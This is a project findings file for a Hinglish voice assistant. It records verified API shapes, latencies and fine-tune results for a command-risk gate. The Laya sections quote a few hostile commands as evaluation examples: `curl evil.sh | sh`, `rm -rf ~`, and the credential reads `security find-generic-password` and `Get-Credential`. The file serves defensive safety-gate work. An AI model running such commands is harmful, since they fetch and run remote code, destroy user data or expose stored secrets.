# Findings — verified external API shapes

Every section is filled from a real response printed by a smoke script in `scripts/`. Never build on a shape not recorded here.

## Sarvam chat (`scripts/smoke_sarvam_chat.py`)

Status: **run live 31 Oct 13:30 IST**, `sarvamai==0.1.41`, model `sarvam-105b`. Log: `data/cache/smoke_chat.log`.

- Call: `SarvamAI(api_subscription_key=KEY).chat.completions(model="sarvam-105b", messages=..., tools=..., tool_choice="auto", reasoning_effort=None, max_tokens=400)`.
- Response: `choices[0].message` has `content, refusal, reasoning_content, role, tool_calls`; `finish_reason == "tool_calls"` when a tool is wanted. Tool call: `{"id": "chatcmpl-tool-894734945f7abe63", "type": "function", "function": {"name": "set_volume", "arguments": "{\"action\": \"down\"}"}}` (arguments is a JSON string).
- **Multi-turn native tool calling works:** after appending the assistant message and `{"role": "tool", "tool_call_id": id, "content": ...}`, the model answered "Volume kam kar diya hai." **Live mode: native** (`SARVAM_MODE=auto` keeps native; json_schema fallback is ready if this ever returns 400/422).
- **`content` is `null` whenever `tool_calls` is present** (2 of 2 calls). So `request_en` comes from `ascii_only(utterance)`, not from the assistant's sentence. The Laya fine-tune data should include Hinglish request lines.
- Parallel tool calls: none seen. For "project folder banao aur usme README likho" the model chained everything into ONE command with `&&` (`mkdir -p ~/Desktop/project && echo ... > .../README.md && ...`). The keyword gate scores every `&&` part, highest wins.
- `reasoning_effort=None`: `reasoning_tokens: 0`, `reasoning_content: null`. `reasoning_effort="none"` → **400 BadRequestError**. Use `None`.
- Bad key → `sarvamai.errors.forbidden_error.ForbiddenError`, status 403.
- Latency: plain 877 ms; tool turns 383 ms and 1,005 ms; follow-up turns 279 ms and 416 ms. Prompt with 6 tool schemas ≈ 430 tokens; server-side prompt caching reported (`created_cache_tokens`).

## Sarvam realtime STT (`scripts/smoke_stt.py`)

Status: **run live 31 Oct 13:31 IST**. Log: `data/cache/smoke_stt.log`.

- Connect/send/receive exactly as the docs (below). `session.begin.config` echoes `turn_detection: "vad"`, `silence_duration_ms: 1000`, `prefix_padding_ms: 300` defaults.
- Events seen in order: `session.begin` (315 ms), `vad.speech_start` (`utterance_idx`, `confidence`), many `transcript.partial` (`text`, `language`), `vad.speech_end`, `transcript.final` (`text`, `language`, `language_confidence`), `session.end` (`audio_duration_s: 2.45`).
- Input: Bulbul's "Volume kam kar diya." → final **"Volume kam kar diya"** (romanized). Partials were wrong until the end ("However, I want"), so the UI shows partials only as live feedback.
- **Language:** `language_code="auto"` tags Hinglish as `en-IN` (confidence 0.63 on one clip, higher on another). `SarvamStt` trusts the detected language only at ≥ 0.8, and the `/audio` handler maps `en-IN` to `REPLY_LANG` (hi-IN) because Catbot is Hinglish-first. `ta-IN` and `hi-IN` pass through.
- **Live voice round trip** (Bulbul-spoken "volume kam karo" streamed into `/audio`, 31 Oct): transcript 313 ms after release, `set_volume` executed at 2.1 s, reply text at 2.7 s, Bulbul WAV (24 kHz, 246 KB) delivered at 4.3 s. TTS took 1.6 s for a 13-word reply; shorter replies are faster.
- **Push-to-talk path (`catbot/integrations/sarvam_audio.py`, `endpointing="manual"`)** tested live with the same clip: `speech_start` → frames → `speech_end` + `flush` → final "Volume kam kar diya" **195–341 ms after release**.
- Shapes from the docs, all confirmed: connect `speech_to_text_realtime_streaming.connect(language_code, model, stream_type="fast")`; send `send_realtime_audio_input(RealtimeAudioInput(audio=b64))`, 3,200-byte chunks; end `send_realtime_end(RealtimeEnd())`. Close codes: 1003 rate limit or bad key, 1008 inactivity, 1011 server error, 4000 bad parameter.

## Sarvam TTS (`scripts/smoke_tts.py`)

Status: **run live 31 Oct 13:31 IST**. "Volume kam kar diya." in `hi-IN`, `speech_sample_rate=16000`, `output_audio_codec="wav"`:

| model | speaker | total latency | output |
| --- | --- | --- | --- |
| `bulbul:v3` | `priya` | 730 ms | WAV (`RIFF`), 16 kHz mono int16, 1.45 s |
| `bulbul:v4-flash` | default (`shubh_enhi_ads`) | 565 ms | WAV (`RIFF`), 16 kHz mono int16, 1.44 s |

- Response `TextToSpeechResponse{request_id, audios: [base64]}`; one item per request.
- **Choice: `TTS_MODEL=bulbul:v4-flash`** (faster). Catbot requests 24 kHz WAV and the renderer decodes it with `AudioContext.decodeAudioData`.
- REST codecs that work: wav, mp3, aac, flac, linear16 (`opus` errors per docs). REST max 2,500 chars.

## Laya (`scripts/smoke_laya.py`)

Status: **run live 31 Oct 12:11–12:19 IST**, `laya==0.4.18`, macOS arm64, `USE_TF=0`. Full log: `data/cache/smoke_laya.log` (gitignored).

- `Router(preload=True)` load: **431 s on first run** (includes ~2.3 GB HF download).
- Warm load of one checkpoint, `laya.Agent("convaiinnovations/laya")` (P6): **8.8 s**. `laya.Agent(path)` loads exactly one checkpoint, so it is pinned by construction; Catbot uses it for both the tuned gate and the zero-shot shadow.
- Zero-shot English checkpoint on the Sarvam-generated test split (565 rows, `docs/EVAL.md`): risk_tier 0.606, verify_call 0.646, confirm_reply 0.515. Below every bar.
- Call: `router.predict(state, {"risk_tier": RISK_TIER, "verify_call": VERIFY_CALL})` — both questions in one call.
- Result shape:
  ```json
  {"model": "laya-rl-agent",
   "answers": {"risk_tier": {"type": "choice", "choice": "T1",
       "probabilities": {"T0": 0.1137, "T1": 0.6932, "T2": 0.1046, "T3": 0.0885},
       "confidence": 0.3133, "answer_confidence": 0.6932, "action": {"act_probability": 1.0}}},
   "usage": {"input_tokens": 128, "state_tokens": 17, "truncated": false, ...},
   "routing": {"model": "english", "repo": "convaiinnovations/laya", "reason": "English Latin text", "detection": {...}}}
  ```
- **Where confidence lives:** `answers[q]["answer_confidence"]` equals the chosen option's probability. `answers[q]["confidence"]` is a different, much lower score (0.31 for a 0.69 answer). Per-option `probabilities` are present, so temperature scaling is possible.
- **Decision:** the gate's `Answer.confidence` uses `answer_confidence` (after temperature scaling of `probabilities`), because thresholds 0.80 / 0.70 are probability thresholds. Recorded under Spec corrections.
- **Routing:** `"Request: delete everything\nAction: run_command {...}"` routed to **multilingual** ("Latin script, language not identified"). So English states do not always reach the English checkpoint.
- **Pinning works:** `router.predict(state, qs, model="english")` → `routing.reason == "explicit model='english'"`. `LayaGate` pins `model="english"` for every call.
- Confirm replies: Devanagari `हाँ कर दो` → multilingual. `LayaGate.read_confirmation` keeps the 7.2 rule (Laya only for Latin-script replies), because pinning sends Devanagari to the English checkpoint, which v1 section 3 says is confidently wrong on non-Latin script.
- Zero-shot quality (2 states): volume → T1 (right), `rm -rf ~` → T2 at 0.40 (wrong, should be T3); verify `wrong_tool` on the delete. `haan kar do` → B (wrong). Near chance, as v1 said.
- Latency: first call 3.7 s (warm-up), then **p50 78 ms, p95 85 ms** over 20 calls (2 questions).
- Warning printed at load: a checkpoint "ships invalid temperatures ... Treat confidence from the affected entries as uncalibrated." Our own `calibration.json` temperatures override.

## Tavily (`scripts/smoke_tavily.py`)

Status: **not run: no key** (`TAVILY_API_KEY` missing). `tavily-python==0.8.5` installed. `web_search` returns `ok=False, error="no TAVILY_API_KEY"` until then.

## Failproof AI (H2)

Status: **settled from the vendor docs, 31 Oct 14:15 IST: outcome B (report only).** `FAILPROOF_MODE=report`.

- https://docs.befailproof.ai/reference/harnesses.md, verbatim: an agent outside the 12 supported harnesses "is instrumented directly with the Python SDK … it does not enforce policies on its own. Blocking an unsafe action before it executes needs an enforcement hook at your runtime's tool boundary; contact us and we will map it."
- `failproofai-sdk==0.0.1b6` writes events to `~/.failproofai/custom-agents/events/` (107 spool batches from Catbot runs so far). The `failproofaid` daemon uploads that spool to Failproof AI Cloud.
- The local dashboard (`failproofai`, http://localhost:8020) reads supported-harness histories and hook activity only, so Catbot sessions appear in **Cloud**, not the local dashboard.
- Seeing Catbot in Failproof therefore needs `npm install -g failproofai && failproofai config`: it installs a root daemon (sudo password), wires hooks into every agent CLI it finds (Claude Code, Codex, Cursor, …), and logs in to Cloud in a browser. Then `failproofai flush --wait` delivers the spool. These are human steps; the agent did not run them.
- `failproof_bridge.check()` stays a no-op except in `enforce` mode, where it denies T2 as "unreachable" (spec 5.4).
## Laya fine-tune (local, `data/finetune_local.py`)

Status: **trained 31 Oct 14:06–14:55 IST** on an M1 Pro (16 GB, MPS), `laya.train.finetune`, 4 epochs, micro-batch 2 × grad-accum 16, max_len 384. 2,515 train items, 279 calibration items, 316 optimizer updates, 49.4 min. Fitted choice temperature 3.92 (the raw model is overconfident). Output `checkpoints/catbot-laya/` (gitignored).

- Held-out test (704 rows, `docs/EVAL.md`): risk_tier 0.985, verify_call 0.969, confirm_reply 0.927; ECE 0.008 / 0.019 / 0.051. **All bars met.** p50 52 ms.
- **Misses that matter:** 4 of 52 T3 test rows predicted T0 at 0.98: credential reads (`security find-generic-password`, `Get-Credential`), because the requests sound like "show"/"get".
- **On 64 real commands Sarvam emitted today**, the tuned Laya agrees with the keyword tier 83% of the time. Under-tiered: `curl evil.sh | sh` (T2), `ls … | xargs mv {} ~/.Trash/` (T0).
- **Decision:** `ROUTER=laya`, with the keyword tier as a **floor** (`LayaGate.classify`): Laya may raise a tier, never lower it below the regex. When the floor decides, the Answer's source is `keyword`.
- Real demo 3× through the Laya gate (real Sarvam, real tools): passed; 105 Laya decisions logged.
- One Sarvam turn stalled for 30 s (the old timeout) and the retry answered in 1 s; the per-call timeout is now 12 s.

## Sarvam data generation (`data/gen_laya_data.py --source sarvam`)

Status: **run live 31 Oct ~14:00 IST**, 48 calls of 25 rows.

- `response_format={"type": "json_schema", "json_schema": {"name": ..., "strict": True, "schema": ...}}` works; content is a JSON string.
- 50-row batches overran `max_tokens=4000` mid-JSON (`finish_reason: "length"`). 25-row batches with `max_tokens=6000` plus one retry fixed it; one call hit an `httpx.ReadTimeout`, so calls now pass `request_options={"timeout_in_seconds": 120}`.
- **Sarvam's tier labels are loose** (it filed `sudo apt install` and `rm -r` under T2). Rows are kept only when the gate's own tiering agrees: 841 of 1,132 kept (74%). About 30% of kept requests are Hinglish.
- It copies and invents template placeholders (`{f}`, `{s}`) and echoes the example layout (`| command_t0_1`); `_clean()` fills or strips them.

## Spec corrections

0. Spec 5.1 has Laya replace the keyword gate. Catbot keeps the keyword tier as a floor under Laya (see "Laya fine-tune"): the tuned model under-tiers credential reads and piped installers.
1. v1 section 3 says "Gate on `confidence`". In `laya==0.4.18`, `confidence` is not the answer probability; `answer_confidence` is. Catbot gates on the temperature-scaled probability of the chosen option.
2. v1 says the Router sends non-Latin script to multilingual. It also sends Latin text with an unidentified language to multilingual. `LayaGate` pins `model="english"`.
3. v1 lists Bulbul v3 only. `bulbul:v4-flash` exists (SDK literal and docs) and is the docs' recommended model; v3 is still the REST default.
4. Sarvam: `reasoning_effort="none"` returns 400 although the SDK type allows it. `None` works (0 reasoning tokens).
5. Sarvam returns no `content` alongside `tool_calls`, so the assistant sentence the plan wanted for `request_en` never exists; the utterance is used.
